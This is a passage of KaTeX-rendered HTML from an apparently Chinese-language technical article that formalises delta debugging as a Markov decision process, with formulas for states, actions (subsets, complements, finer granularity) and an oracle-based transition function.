class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">⟩</span></span></span></span></eq>,其中<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span></eq>是候选程序列表,<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span></eq>是粒度等级</li><li>Action:状态<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>=</mo><mo stretchy="false">⟨</mo><mi>L</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">⟩</mo></mrow><annotation encoding="application/x-tex">s=\langle L,n \rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⟨</span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">⟩</span></span></span></span></eq>的可能的行为<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span></span></span></eq>定义为<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">{</mo><mo stretchy="false">⟨</mo><mo stretchy="false">⟨</mo><msub><mi>u</mi><mn>1</mn></msub><mo stretchy="false">⟩</mo><mo separator="true">,</mo><mn>2</mn><mo stretchy="false">⟩</mo><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mo stretchy="false">⟨</mo><mo stretchy="false">⟨</mo><msub><mi>u</mi><mi>n</mi></msub><mo stretchy="false">⟩</mo><mo separator="true">,</mo><mn>2</mn><mo stretchy="false">⟩</mo><mo stretchy="false">}</mo><mspace width="1em"><mo stretchy="false">(</mo><mi>s</mi><mi>u</mi><mi>b</mi><mi>s</mi><mi>e</mi><mi>t</mi><mi>s</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mo>∪</mo><mtext> </mtext><mo stretchy="false">{</mo><mo stretchy="false">⟨</mo><mo stretchy="false">⟨</mo><mi>L</mi><mi mathvariant="normal">/</mi><msub><mi>u</mi><mn>1</mn></msub><mo stretchy="false">⟩</mo><mo separator="true">,</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">⟩</mo><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><mo stretchy="false">⟨</mo><mo stretchy="false">⟨</mo><mi>L</mi><mi mathvariant="normal">/</mi><msub><mi>u</mi><mi>n</mi></msub><mo stretchy="false">⟩</mo><mo separator="true">,</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">⟩</mo><mo stretchy="false">}</mo><mtext> </mtext><mtext> </mtext><mtext> </mtext><mtext> </mtext><mo stretchy="false">(</mo><mi>c</mi><mi>o</mi><mi>m</mi><mi>p</mi><mi>l</mi><mi>e</mi><mi>m</mi><mi>e</mi><mi>n</mi><mi>t</mi><mi>s</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mo>∪</mo><mo stretchy="false">{</mo><mo stretchy="false">⟨</mo><mi>L</mi><mo separator="true">,</mo><mn>2</mn><mi>n</mi><mo stretchy="false">⟩</mo><mo stretchy="false">}</mo><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>r</mi><mi>e</mi><mtext> </mtext><mtext> </mtext><mi>g</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>u</mi><mi>l</mi><mi>a</mi><mi>r</mi><mi>i</mi><mi>t</mi><mi>y</mi><mo stretchy="false">)</mo></mspace></mrow><annotation encoding="application/x-tex">A(s)=\{ \langle \langle u_1 \rangle ,2 \rangle,..., \langle \langle u_n \rangle ,2 \rangle \} \quad (subsets) \\ \cup\, \{ \langle \langle L/u_1 \rangle ,n-1 \rangle,..., \langle \langle L/u_n \rangle ,n-1 \rangle \} \,\,\,\, (complements) \\ \cup \{ \langle  L  ,2n \rangle \} (more\,\, granularity)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{⟨⟨</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">⟩</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mclose">⟩</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">⟨⟨</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">⟩</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mclose">⟩}</span><span class="mspace" style="margin-right:1em;"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord mathnormal">b</span><span class="mord mathnormal">se</span><span class="mord mathnormal">t</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∪</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">{⟨⟨</span><span class="mord mathnormal">L</span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">⟩</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">⟩</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">⟨⟨</span><span class="mord mathnormal">L</span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">⟩</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">⟩}</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">(</span><span class="mord mathnormal">co</span><span class="mord mathnormal">m</span><span class="mord mathnormal" style="margin-right:0.01968em;">pl</span><span class="mord mathnormal">e</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∪</span><span class="mopen">{⟨</span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mord mathnormal">n</span><span class="mclose">⟩}</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">ore</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">an</span><span class="mord mathnormal">u</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">i</span><span class="mord mathnormal">t</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></span></eqn></section> 即<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">A(s)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span></span></span></span></eq>由当前状态中下一个候选程序和所有粒度对组成</li><li>Transition function:转移函数定义如下,(<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo>=</mo><mo stretchy="false">⟨</mo><mi>L</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">⟩</mo><mo separator="true">,</mo><mi>a</mi><mo>=</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">s=\langle L,n \rangle,a=s&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">⟨</span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mclose">⟩</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7519em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></eq>) <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">T(s&#x27;|s,a)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span></span></span></span></eq>定义为<section><eqn><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>T</mi><mo stretchy="false">(</mo><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mi mathvariant="normal">∣</mi><mi>s</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mi>f</mi><mtext> </mtext><mtext> </mtext><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mo stretchy="false">⟨</mo><msub><mi>u</mi><mi>i</mi></msub><mo separator="true">,</mo><mn>2</mn><mo stretchy="false">⟩</mo><mtext> </mtext><mtext> </mtext><mo separator="true">,</mo><mtext> </mtext><mtext> </mtext><mi>O</mi><mo stretchy="false">(</mo><msub><mi>u</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>T</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mi>f</mi><mtext> </mtext><mtext> </mtext><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mo stretchy="false">⟨</mo><mi>L</mi><mi mathvariant="normal">/</mi><msub><mi>u</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">⟩</mo><mtext> </mtext><mtext> </mtext><mo separator="true">,</mo><mtext> </mtext><mtext> </mtext><mi>O</mi><mo stretchy="false">(</mo><mi>L</mi><mi mathvariant="normal">/</mi><msub><mi>u</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>T</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>i</mi><mi>f</mi><mtext> </mtext><mtext> </mtext><msup><mi>s</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mo stretchy="false">⟨</mo><mi>L</mi><mo separator="true">,</mo><mn>2</mn><mi>n</mi><mo stretchy="false">⟩</mo><mtext> </mtext><mtext> </mtext><mo separator="true">,</mo><mtext> </mtext><mtext> </mtext><mi mathvariant="normal">∄</mi><mi>i</mi><mi mathvariant="normal">.</mi><mi>O</mi><mo stretchy="false">(</mo><msub><mi>u</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>T</mi><mo>∨</mo><mi>O</mi><mo stretchy="false">(</mo><mi>L</mi><mi mathvariant="normal">/</mi><msub><mi>u</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mi>T</mi><mtext> </mtext></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>o</mi><mi>t</mi><mi>h</mi><mi>e</mi><mi>r</mi><mi>w</mi><mi>i</mi><mi>s</mi><mi>e</mi></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">T(s&#x27;|s,a)=\begin{cases} 1 &amp; if\,\,s&#x27;=\langle u_i,2 \rangle \,\,,\,\,O(u_i)=T \\ 1 &amp; if\,\,s&#x27;=\langle L/u_i,n-1 \rangle \,\,,\,\,O(L/u_i)=T\\ 1 &amp; if\,\,s&#x27;=\langle L,2n \rangle \,\,,\,\, \nexists i. O(u_i)=T \lor O(L/u_i)=T\ \\0 &amp; otherwise \end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0519em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:5.76em;vertical-align:-2.63em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.95em;"><span style="top:-1.6em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-1.592em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.916em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.916em" style="width:0.8889em" viewbox="0 0 888.89 916" preserveaspectratio="xMinYMin"><path d="M384 0 H504 V916 H384z M384 0 H504 V916 H384z"/></svg></span></span><span style="top:-3.15em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.292em;"><span class="pstrut" style="height:3.15em;"></span><span style="height:0.916em;width:0.8889em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.8889em" height="0.916em" style="width:0.8889em" viewbox="0 0 888.89 916" preserveaspectratio="xMinYMin"><path d="M384 0 H504 V916 H384z M384 0 H504 V916 H384z"/></svg></span></span><span style="top:-5.2em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.45em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.13em;"><span style="top:-5.13em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-0.81em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:2.63em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:3.13em;"><span style="top:-5.13em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">⟨</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mclose">⟩</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span><span style="top:-3.69em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">⟨</span><span class="mord mathnormal">L</span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">⟩</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">L</span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mopen">⟨</span><span class="mord mathnormal">L</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mord mathnormal">n</span><span class="mclose">⟩</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord amsrm">∄</span><span class="mord mathnormal">i</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∨</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">L</span><span class="mord">/</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mspace"> </span></span></span><span style="top:-0.81em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathnormal">o</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mord mathnormal" style="margin-right:0.02778em;">er</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">i</span><span class="mord mathnormal">se</span></span></span></span><span 